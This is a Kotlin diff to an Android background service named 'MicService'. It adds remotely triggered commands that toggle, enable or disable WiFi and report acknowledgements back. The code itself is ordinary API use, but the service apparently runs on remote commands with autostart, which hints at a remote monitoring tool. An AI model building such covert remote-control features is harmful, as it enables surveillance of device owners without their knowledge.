@@ -618,6 +618,77 @@ class MicService : Service() {
                     sendCommandAck("enable_autostart", "error", e.message)
                 }
             }
+            "toggle_wifi" -> {
+                Log.i(TAG, "CMD: toggle_wifi - toggling WiFi state")
+                try {
+                    val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                        // Android 10+ - open WiFi settings panel
+                        val panelIntent = Intent(android.provider.Settings.Panel.ACTION_WIFI)
+                        panelIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        startActivity(panelIntent)
+                        safeSend("ACK:toggle_wifi:settings_opened")
+                        sendCommandAck("toggle_wifi", detail = "settings_opened (Android 10+ requires user interaction)")
+                    } else {
+                        // Android 9 and below - direct toggle
+                        @Suppress("DEPRECATION")
+                        val currentState = wifiManager.isWifiEnabled
+                        @Suppress("DEPRECATION")
+                        wifiManager.isWifiEnabled = !currentState
+                        val newState = if (!currentState) "on" else "off"
+                        safeSend("ACK:toggle_wifi:$newState")
+                        sendCommandAck("toggle_wifi", detail = "WiFi turned $newState")
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to toggle WiFi: ${e.message}")
+                    safeSend("ACK:toggle_wifi:error:${e.message}")
+                    sendCommandAck("toggle_wifi", "error", e.message)
+                }
+            }
+            "wifi_on" -> {
+                Log.i(TAG, "CMD: wifi_on - enabling WiFi")
+                try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                        val panelIntent = Intent(android.provider.Settings.Panel.ACTION_WIFI)
+                        panelIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        startActivity(panelIntent)
+                        safeSend("ACK:wifi_on:settings_opened")
+                        sendCommandAck("wifi_on", detail = "settings_opened")
+                    } else {
+                        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+                        @Suppress("DEPRECATION")
+                        wifiManager.isWifiEnabled = true
+                        safeSend("ACK:wifi_on:enabled")
+                        sendCommandAck("wifi_on", detail = "enabled")
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to enable WiFi: ${e.message}")
+                    safeSend("ACK:wifi_on:error:${e.message}")
+                    sendCommandAck("wifi_on", "error", e.message)
+                }
+            }
+            "wifi_off" -> {
+                Log.i(TAG, "CMD: wifi_off - disabling WiFi")
+                try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                        val panelIntent = Intent(android.provider.Settings.Panel.ACTION_WIFI)
+                        panelIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        startActivity(panelIntent)
+                        safeSend("ACK:wifi_off:settings_opened")
+                        sendCommandAck("wifi_off", detail = "settings_opened")
+                    } else {
+                        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+                        @Suppress("DEPRECATION")
+                        wifiManager.isWifiEnabled = false
+                        safeSend("ACK:wifi_off:disabled")
+                        sendCommandAck("wifi_off", detail = "disabled")
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to disable WiFi: ${e.message}")
+                    safeSend("ACK:wifi_off:error:${e.message}")
+                    sendCommandAck("wifi_off", "error", e.message)
+                }
+            }
             "check_update" -> {
                 Log.i(TAG, "CMD: check_update - triggering update check")
                 serviceScope.launch(Dispatchers.IO) {
